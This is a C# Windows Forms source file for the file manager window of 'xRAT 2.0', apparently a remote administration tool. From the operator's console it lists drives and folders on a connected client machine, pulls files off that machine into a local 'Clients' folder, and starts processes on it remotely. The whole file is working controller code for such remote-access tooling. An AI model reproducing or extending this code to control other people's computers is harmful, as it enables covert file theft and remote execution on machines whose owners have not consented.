using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Core;
using System.Threading;

namespace xRAT_2.Forms
{
    public partial class frmFileManager : Form
    {
        private Client cClient;
        private string currentDir;
        private ListViewColumnSorter lvwColumnSorter;

        public frmFileManager(Client c)
        {
            cClient = c;
            cClient.Value.frmFM = this;
            InitializeComponent();

            lvwColumnSorter = new ListViewColumnSorter();
            lstDirectory.ListViewItemSorter = lvwColumnSorter;
        }

        private void frmFileManager_Load(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
                new Core.Packets.ServerPackets.Drives().Execute(cClient);
            }
        }

        private void frmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (cClient.Value != null)
                cClient.Value.frmFM = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                if (cClient.Value != null)
                {
                    if (cClient.Value.lastDirectorySeen)
                    {
                        currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
                        new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
                        cClient.Value.lastDirectorySeen = false;
                    }
                }
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                    {
                        if (cClient.Value != null)
                        {
                            if (!currentDir.EndsWith(@"\"))
                                currentDir = currentDir + @"\";

                            currentDir = currentDir.Remove(currentDir.Length - 1);

                            if (currentDir.Length > 2)
                                currentDir = currentDir.Remove(currentDir.LastIndexOf(@"\"));

                            if (!currentDir.EndsWith(@"\"))
                                currentDir = currentDir + @"\";

                            new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
                            cClient.Value.lastDirectorySeen = false;
                        }
                    }
                    else if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir")
                    {
                        if (cClient.Value != null)
                        {
                            if (cClient.Value.lastDirectorySeen)
                            {
                                if (currentDir.EndsWith(@"\"))
                                    currentDir = currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
                                else
                                    currentDir = currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;

                                new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
                                cClient.Value.lastDirectorySeen = false;
                            }
                        }
                    }
                }
            }
        }

        private void ctxtDownload_Click(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    new Thread(new ThreadStart(() =>
                    {
                        foreach (ListViewItem files in lstDirectory.SelectedItems)
                        {
                            if (files.Tag.ToString() == "file")
                            {
                                string path = currentDir;
                                if (path.EndsWith(@"\"))
                                    path = path + files.SubItems[0].Text;
                                else
                                    path = path + @"\" + files.SubItems[0].Text;

                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index;

                                new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(cClient);

                                ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
                                
                                this.Invoke((MethodInvoker)delegate
                                {
                                    lstTransfers.Items.Add(lvi);
                                });

                                Thread.Sleep(50);
                            }
                        }
                    })).Start();
                }
            }
        }

        private void ctxtExecute_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = currentDir;
                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    if (cClient != null)
                        new Core.Packets.ServerPackets.StartProcess(path).Execute(cClient);
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());

            if (Directory.Exists(downloadPath))
                Process.Start(downloadPath);
            else
                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
                cClient.Value.lastDirectorySeen = false;
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstDirectory.Sort();
        }
    }
}
